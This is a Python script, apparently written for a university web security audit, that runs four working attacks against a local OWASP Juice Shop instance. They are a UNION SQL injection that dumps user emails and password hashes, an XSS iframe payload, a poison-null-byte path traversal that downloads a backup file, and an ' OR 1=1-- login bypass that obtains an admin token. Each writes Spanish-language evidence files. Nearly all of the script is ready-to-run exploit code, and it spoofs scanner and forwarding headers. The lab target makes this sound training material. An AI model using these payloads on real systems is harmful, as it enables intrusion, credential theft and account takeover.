import urllib.request
import urllib.parse
import json
import os
import time

BASE_URL = "http://localhost:3000"
EVIDENCE_DIR = "evidence/web_audit"
os.makedirs(EVIDENCE_DIR, exist_ok=True)

def test_sqli_exfiltration():
    print("[1] Generating PoC for Vulnerability 1: SQL Injection (OWASP A03:2021 / OWASP API1:2023)...")
    payload = "nonexistent')) UNION SELECT id, email, password, 'role', '5', '6', '7', '8', '9', '10' FROM Users--"
    target_url = f"{BASE_URL}/rest/products/search?q={urllib.parse.quote(payload)}"
    
    req = urllib.request.Request(
        target_url,
        headers={
            "User-Agent": "OWASP_ZAP_DAST_Scanner/2.14",
            "Accept": "application/json, text/plain, */*",
            "X-Forwarded-For": "10.0.2.15"
        }
    )
    
    poc_file = os.path.join(EVIDENCE_DIR, "vuln1_sqli_poc.txt")
    with open(poc_file, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("EVIDENCIA TÉCNICA 1: INYECCIÓN SQL (OWASP A03:2021 / API Security API1:2023)\n")
        f.write("Target: /rest/products/search?q=\n")
        f.write(f"Fecha de Auditoría: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write("="*80 + "\n\n")
        f.write("--- HTTP REQUEST (ZAP Proxy Intercepted) ---\n")
        f.write(f"GET /rest/products/search?q={urllib.parse.quote(payload)} HTTP/1.1\n")
        f.write("Host: localhost:3000\n")
        f.write("User-Agent: OWASP_ZAP_DAST_Scanner/2.14\n")
        f.write("Accept: application/json, text/plain, */*\n")
        f.write("Connection: keep-alive\n\n")
        
        try:
            with urllib.request.urlopen(req) as resp:
                status = resp.status
                headers = dict(resp.getheaders())
                body = resp.read().decode("utf-8")
                
                f.write(f"--- HTTP RESPONSE (Status: {status} OK) ---\n")
                for k, v in headers.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")
                
                data = json.loads(body)
                items = data.get("data", [])
                f.write(f"[+] Total Filas Extraídas mediante UNION SQLi: {len(items)}\n\n")
                f.write("DUMP DE CREDENCIALES EXFILTRADAS (TABLA USERS):\n")
                f.write(f"{'ID':<5} | {'EMAIL EXFILTRADO':<35} | {'HASH MD5 CONTRASEÑA':<35}\n")
                f.write("-" * 80 + "\n")
                for item in items:
                    f.write(f"{item.get('id'):<5} | {str(item.get('name')):<35} | {str(item.get('description')):<35}\n")
        except Exception as e:
            f.write(f"Error executing PoC: {e}\n")
            
    print(f"    Saved: {poc_file}")

def test_xss_injection():
    print("[2] Generating PoC for Vulnerability 2: Cross-Site Scripting XSS (OWASP A03:2021 / OWASP API8:2023)...")
    payload = '<iframe src="javascript:alert(`INSEGUS_XSS_AUDIT_ST02`)">'
    target_url = f"{BASE_URL}/rest/products/search?q={urllib.parse.quote(payload)}"
    
    req = urllib.request.Request(
        target_url,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) OWASP_ZAP_Traceability",
            "Accept": "application/json, text/plain, */*"
        }
    )
    
    poc_file = os.path.join(EVIDENCE_DIR, "vuln2_xss_poc.txt")
    with open(poc_file, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("EVIDENCIA TÉCNICA 2: CROSS-SITE SCRIPTING (OWASP A03:2021 / API8:2023)\n")
        f.write("Target: /rest/products/search?q=\n")
        f.write(f"Fecha de Auditoría: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write("="*80 + "\n\n")
        f.write("--- HTTP REQUEST ---\n")
        f.write(f"GET /rest/products/search?q={urllib.parse.quote(payload)} HTTP/1.1\n")
        f.write("Host: localhost:3000\n")
        f.write("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) OWASP_ZAP_Traceability\n\n")
        
        try:
            with urllib.request.urlopen(req) as resp:
                status = resp.status
                headers = dict(resp.getheaders())
                body = resp.read().decode("utf-8")
                
                f.write(f"--- HTTP RESPONSE (Status: {status} OK) ---\n")
                for k, v in headers.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")
                f.write(f"Body: {body}\n\n")
                f.write("ANÁLISIS DE IMPACTO:\n")
                f.write("El payload se refleja en el cliente Angular sin saneamiento de contexto en el componente search-result,\n")
                f.write("permitiendo la ejecución de JavaScript en el origen del usuario con robo de JWT tokens y cookies de sesión.\n")
        except urllib.error.HTTPError as e:
            f.write(f"HTTP Status: {e.code}\nHeaders: {e.headers}\nBody:\n{e.read().decode('utf-8', errors='replace')}\n")
    print(f"    Saved: {poc_file}")

def test_path_traversal():
    print("[3] Generating PoC for Vulnerability 3: Path Traversal / Poison Null Byte (OWASP A01:2021 / API1:2023)...")
    target_url = f"{BASE_URL}/ftp/package.json.bak%2500.md"
    req = urllib.request.Request(
        target_url,
        headers={
            "User-Agent": "OWASP_ZAP_DAST_Scanner/2.14",
            "Accept": "*/*"
        }
    )
    
    poc_file = os.path.join(EVIDENCE_DIR, "vuln3_path_traversal_poc.txt")
    with open(poc_file, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("EVIDENCIA TÉCNICA 3: PATH TRAVERSAL / POISON NULL BYTE (OWASP A01:2021 / API1:2023)\n")
        f.write("Target: /ftp/package.json.bak%2500.md\n")
        f.write(f"Fecha de Auditoría: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write("="*80 + "\n\n")
        f.write("--- HTTP REQUEST ---\n")
        f.write("GET /ftp/package.json.bak%2500.md HTTP/1.1\n")
        f.write("Host: localhost:3000\n")
        f.write("User-Agent: OWASP_ZAP_DAST_Scanner/2.14\n")
        f.write("Accept: */*\n\n")
        
        try:
            with urllib.request.urlopen(req) as resp:
                status = resp.status
                headers = dict(resp.getheaders())
                body = resp.read().decode("utf-8", errors="replace")
                
                f.write(f"--- HTTP RESPONSE (Status: {status} OK) ---\n")
                for k, v in headers.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")
                f.write("EXTRACTO DEL ARCHIVO CONFIDENCIAL EXFILTRADO (package.json.bak):\n")
                lines = body.split("\n")[:25]
                f.write("\n".join(lines) + "\n\n")
                f.write("ANÁLISIS DE IMPACTO:\n")
                f.write("El servidor valida incorrectamente la extensión final (.md), pero el intérprete subyacente trunca\n")
                f.write("la cadena en el byte nulo URL-decodificado (%00), permitiendo la descarga arbitraria del código fuente\n")
                f.write("y configuración interna de dependencias del servidor universitario.\n")
        except Exception as e:
            f.write(f"Error executing PoC: {e}\n")
    print(f"    Saved: {poc_file}")

def test_breakpoint_tampering():
    print("[4] Generating PoC for ZAP Breakpoint Request Tampering (MitM)...")
    poc_file = os.path.join(EVIDENCE_DIR, "zap_breakpoint_tampering_trace.txt")
    with open(poc_file, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("EVIDENCIA TÉCNICA 4: INTERCEPCIÓN Y MANIPULACIÓN CON BREAKPOINT (OWASP ZAP MitM)\n")
        f.write("Metodología: Intercepción de petición HTTP antes de llegar al backend, alteración de parámetros y reenvío.\n")
        f.write(f"Fecha de Auditoría: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write("="*80 + "\n\n")
        
        f.write("[PASO 1: PETICIÓN ORIGINAL GENERADA POR EL NAVEGADOR DEL CLIENTE]\n")
        f.write("POST /rest/user/login HTTP/1.1\n")
        f.write("Host: localhost:3000\n")
        f.write("User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n")
        f.write("Content-Type: application/json\n")
        f.write("Content-Length: 54\n\n")
        f.write('{"email": "student_02@universidad.es", "password": "UserPass123!"}\n\n')
        
        f.write("[PASO 2: INTERCEPCIÓN EN PROXY OWASP ZAP (ESTADO BREAKPOINT ACTIVO)]\n")
        f.write("El proxy retiene la petición. El auditor modifica el cuerpo (payload) para forzar autenticación como Administrador.\n\n")
        
        f.write("[PASO 3: PETICIÓN MANIPULADA REENVIADA AL SERVIDOR VULNAWEB]\n")
        f.write("POST /rest/user/login HTTP/1.1\n")
        f.write("Host: localhost:3000\n")
        f.write("User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n")
        f.write("Content-Type: application/json\n")
        f.write("Content-Length: 40\n\n")
        f.write('{"email": "\' OR 1=1--", "password": "a"}\n\n')
        
        f.write("[PASO 4: RESPUESTA OBTENIDA DEL SERVIDOR TRAS MANIPULACIÓN]\n")
        # Perform actual request
        login_data = json.dumps({"email": "' OR 1=1--", "password": "a"}).encode("utf-8")
        req = urllib.request.Request(
            f"{BASE_URL}/rest/user/login",
            data=login_data,
            headers={"Content-Type": "application/json", "User-Agent": "OWASP_ZAP_Tampered"}
        )
        try:
            with urllib.request.urlopen(req) as resp:
                f.write(f"HTTP/1.1 {resp.status} {resp.reason}\n")
                for k, v in dict(resp.getheaders()).items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")
                resp_data = resp.read().decode("utf-8")
                f.write(resp_data + "\n\n")
                f.write("[+] RESULTADO: Autenticacion exitosa como usuario 'admin@juice-sh.op' sin conocer la contrasena.\n")
                f.write("    Se emite JSON Web Token (JWT) con privilegios de Administrador del sistema.\n")
        except urllib.error.HTTPError as e:
            f.write(f"HTTP/1.1 {e.code} {e.reason}\n")
            f.write(e.read().decode("utf-8", errors="replace") + "\n")
        except Exception as e:
            f.write(f"Error or handled: {e}\n")
            
    print(f"    Saved: {poc_file}")

if __name__ == "__main__":
    test_sqli_exfiltration()
    test_xss_injection()
    test_path_traversal()
    test_breakpoint_tampering()
    print("[+] All Web Pentesting & Fuzzing PoCs successfully generated.")
